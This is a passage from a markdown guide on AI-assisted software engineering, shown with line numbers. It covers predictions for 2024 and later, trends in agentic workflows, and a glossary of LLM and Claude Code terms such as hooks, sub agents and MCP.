   246â†’
   247â†’## V. Future Directions and Predictions
   248â†’
   249â†’### 2024+ Predictions
   250â†’- OpenAI continued leadership with industry adaptation
   251â†’- Open-source LLMs reaching GPT-3.5 Turbo performance
   252â†’- No-code/low-code standard integration
   253â†’- Programmer division: fundamental skills + AI vs. AI shortcuts
   254â†’- Universal IDE integration of AI assistants
   255â†’- Prompt engineering maturation into specialized roles
   256â†’
   257â†’### Advanced Agentic Workflows
   258â†’- **Fully Trusted Systems**: Moving beyond prompting to automated engineering value
   259â†’- **Multi-Model Reasoning**: Combining LLMs for superior decision-making
   260â†’- **Improved Observability**: Better tracking and behavior steering
   261â†’- **Self-Correction Loops**: Automated feedback and refinement
   262â†’- **Specialized Agents**: Task-specific optimization
   263â†’- **Human-AI Collaboration**: Optimized interaction patterns
   264â†’- **Sandboxed Environments**: Safe testing and development
   265â†’- **LLM Understanding**: Interpretability and explanation engineering
   266â†’- **Hybridization**: Integration with existing engineering frameworks
   267â†’
   268â†’## Glossary of Key Terms
   269â†’
   270â†’### Core Concepts
   271â†’- **Agentic Software/Systems**: AI systems operating independently for complex, multi-step tasks
   272â†’- **Agent OS**: Micro-architecture with LPU, IO, and RAM components
   273â†’- **Autonomy**: Degree of independent operation without human intervention
   274â†’- **Compute Scaling**: Increasing computational power for problem-solving
   275â†’- **Context Window**: Maximum text an LLM can process simultaneously
   276â†’
   277â†’### Technical Terms
   278â†’- **Prompt Chaining**: Linking prompts where output becomes next input
   279â†’- **Few-shot Learning**: Using examples to guide model behavior
   280â†’- **Hallucination**: Generation of incorrect but plausible-seeming information
   281â†’- **Temperature**: Parameter controlling output randomness/creativity
   282â†’- **Token**: Atomic unit of text processed by LLMs
   283â†’
   284â†’### Claude Code Specific
   285â†’- **CLAUDE.md**: Special file for persistent memory and instructions
   286â†’- **Hooks**: Lifecycle event scripts for automation
   287â†’- **Sub Agents**: Single-purpose AI agents for specialized tasks
   288â†’- **MCP**: Model Context Protocol for external system integration
   289â†’- **Slash Commands**: Interactive commands for workflow automation
   290â†’
   291â†’### Development Concepts
   292â†’- **Semantic Linting**: Code analysis understanding meaning and intent
   293â†’- **Human-in-the-Loop**: Intentional human oversight integration
   294â†’- **Skill Rot**: Degradation of fundamental skills through over-reliance
   295â†’- **Fusion Chain/Beam**: Multi-model parallel processing technique
   296â†’
   297â†’## Navigation
   298â†’
   299â†’- **Examples**: [5-Minute Setup](../../examples/getting-started/5-minute-setup/) - Quick start guide
   300â†’- **Advanced**: [Hooks Mastery](../../examples/claude-code-hooks-mastery/) - Advanced automation
   301â†’- **Templates**: [Basic CLAUDE.md](../../templates/claude-md-templates/basic.md) - Project setup
   302â†’
   303â†’---
   304â†’
   305â†’*This guide synthesizes insights from comprehensive research on AI in software engineering. For practical implementation, see the examples and templates directories.*
